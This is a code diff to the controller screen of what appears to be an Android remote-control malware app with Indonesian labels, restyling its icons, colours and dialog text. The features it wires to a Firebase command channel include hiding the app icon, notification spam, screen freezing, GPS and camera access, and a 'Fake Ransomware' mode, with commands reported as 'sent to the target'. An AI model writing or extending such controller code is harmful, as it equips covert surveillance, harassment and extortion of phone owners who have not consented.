@@ -6,7 +6,6 @@ import android.os.Handler;
 import android.view.View;
 import android.widget.Button;
 import android.widget.GridLayout;
-import android.widget.ImageView;
 import android.widget.Switch;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -53,12 +52,7 @@ public class ControlActivity extends AppCompatActivity {
             "Video Overlay", "Hide Icon", "Spam Notifikasi", "Stuck Layar",
             "GPS", "Kamera", "Fake Ransomware", "Ngehang"
         };
-        int[] fiturIcons = {
-            R.drawable.ic_flashlight, R.drawable.ic_lock, R.drawable.ic_lock,
-            R.drawable.ic_palette, R.drawable.ic_video, R.drawable.ic_hide,
-            R.drawable.ic_spam, R.drawable.ic_stuck, R.drawable.ic_gps,
-            R.drawable.ic_camera, R.drawable.ic_ransom, R.drawable.ic_ngehang
-        };
+        String[] fiturIcons = {"🔦", "🔒", "🔒", "🎨", "🎬", "👻", "📨", "🔒", "📍", "📸", "💰", "💀"};
         boolean[] isToggle = {true, true, true, false, false, true, false, false, false, false, false, true};
 
         gridFitur.removeAllViews();
@@ -66,13 +60,13 @@ public class ControlActivity extends AppCompatActivity {
         for (int i = 0; i < fiturNames.length; i++) {
             View card = getLayoutInflater().inflate(R.layout.card_fitur_premium, null);
 
-            ImageView icon = card.findViewById(R.id.ivIcon);
+            TextView icon = card.findViewById(R.id.ivIcon);
             TextView nama = card.findViewById(R.id.tvNamaFitur);
             TextView status = card.findViewById(R.id.tvStatusFitur);
             Switch sw = card.findViewById(R.id.swFitur);
             Button btnAction = card.findViewById(R.id.btnAction);
 
-            icon.setImageResource(fiturIcons[i]);
+            icon.setText(fiturIcons[i]);
             nama.setText(fiturNames[i]);
 
             if (isToggle[i]) {
@@ -81,12 +75,12 @@ public class ControlActivity extends AppCompatActivity {
                 status.setVisibility(View.VISIBLE);
 
                 status.setText("OFF");
-                status.setTextColor(0xFFE56A8D);
+                status.setTextColor(0xFF8B0000);
 
                 final int index = i;
                 sw.setOnCheckedChangeListener((buttonView, isChecked) -> {
                     status.setText(isChecked ? "ON" : "OFF");
-                    status.setTextColor(isChecked ? 0xFF30D158 : 0xFFE56A8D);
+                    status.setTextColor(isChecked ? 0xFFFF1A1A : 0xFF8B0000);
                     mDatabase.child(fiturNames[index].toLowerCase()).setValue(isChecked);
                     showSnackbar("✅ " + fiturNames[index] + " " + (isChecked ? "ON" : "OFF"));
                 });
@@ -107,20 +101,20 @@ public class ControlActivity extends AppCompatActivity {
 
     private void showConfirmDialog(String fiturName) {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("Konfirmasi");
+        builder.setTitle("🐉 Konfirmasi");
         builder.setMessage("Apakah Anda yakin ingin menjalankan fitur " + fiturName + "?");
-        builder.setPositiveButton("Jalankan", (dialog, which) -> {
+        builder.setPositiveButton("🔥 Jalankan", (dialog, which) -> {
             showSnackbar("⏳ Mengirim perintah...");
             handler.postDelayed(() -> {
                 mDatabase.child("command").setValue(fiturName.toLowerCase());
                 showSnackbar("✅ Perintah berhasil dikirim ke target");
             }, 1000);
         });
-        builder.setNegativeButton("Batal", null);
+        builder.setNegativeButton("🐉 Batal", null);
         builder.show();
     }
 
     private void showSnackbar(String message) {
         Snackbar.make(findViewById(android.R.id.content), message, Snackbar.LENGTH_SHORT).show();
     }
-                        }
+}
